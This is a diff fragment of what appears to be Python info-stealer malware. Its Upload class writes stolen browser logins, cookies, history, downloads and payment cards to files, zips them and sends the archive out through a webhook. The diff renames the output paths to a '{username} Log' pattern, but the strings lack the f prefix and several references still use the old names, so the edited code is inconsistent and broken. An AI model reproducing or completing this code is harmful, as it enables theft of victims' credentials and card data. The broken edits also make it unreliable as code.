@@ -33,35 +33,35 @@ class Upload:
         self.clean()
     
     def write_files(self):
-        os.makedirs("Log", exist_ok=True)
+        os.makedirs("{username} Log", exist_ok=True)
         if __LOGINS__:
-            with open("Log\\logins.txt", "w", encoding="utf-8") as f:
+            with open("{username} Log\\logins.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __LOGINS__))
 
         if __COOKIES__:
-            with open("Log\\cookies.txt", "w", encoding="utf-8") as f:
+            with open("{username} Log\\cookies.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __COOKIES__))
 
         if __WEB_HISTORY__:
-            with open("Log\\web_history.txt", "w", encoding="utf-8") as f:
+            with open("{username} Log\\web_history.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __WEB_HISTORY__))
 
         if __DOWNLOADS__:
-            with open("Log\\downloads.txt", "w", encoding="utf-8") as f:
+            with open("{username} Log\\downloads.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __DOWNLOADS__))
 
         if __CARDS__:
-            with open("Log\\cards.txt", "w", encoding="utf-8") as f:
+            with open("{username} Log\\cards.txt", "w", encoding="utf-8") as f:
                 f.write('\n'.join(str(x) for x in __CARDS__))
 
-        with ZipFile("Log.zip", "w") as zip:
+        with ZipFile("{username} Log.zip", "w") as zip:
             for file in os.listdir("Log"):
-                zip.write(f"Log\\{file}", file)
+                zip.write(f"{username} Log\\{file}", file)
 
     def send(self):
         self.webhook.send(
             embed=Embed(
-                title="Log",
+                title="{username} Log",
                 description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
             ),
             file=File("Log.zip"),
